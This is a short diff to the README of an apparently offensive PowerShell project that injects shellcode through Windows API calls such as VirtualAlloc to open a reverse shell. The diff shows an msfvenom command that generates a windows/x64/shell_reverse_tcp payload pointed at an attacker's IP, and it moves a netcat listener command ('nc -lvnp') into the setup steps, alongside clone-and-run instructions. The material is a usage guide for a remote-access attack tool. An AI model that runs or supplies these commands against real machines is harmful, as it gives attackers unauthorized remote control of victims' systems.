@@ -8,6 +8,8 @@ This project provides a PowerShell script that uses Windows API functions to inj
 - Change the line 37.
   ```bash
   msfvenom -p windows/x64/shell_reverse_tcp lhost=YOUR_IP lport=PORT -f powershell
+  nc -lvnp YOURPORT
+  
 
 ## Features
 - Allocates memory using `VirtualAlloc`.
@@ -24,5 +26,4 @@ This project provides a PowerShell script that uses Windows API functions to inj
    ```bash
    git clone https://github.com/thangcongtran/Reverse-Shell-Powershell.git
    cd Reverse-Shell-Powershell
-   nc -lvnp YOURPORT
    .\Reverse-Shell-Powershell.ps1
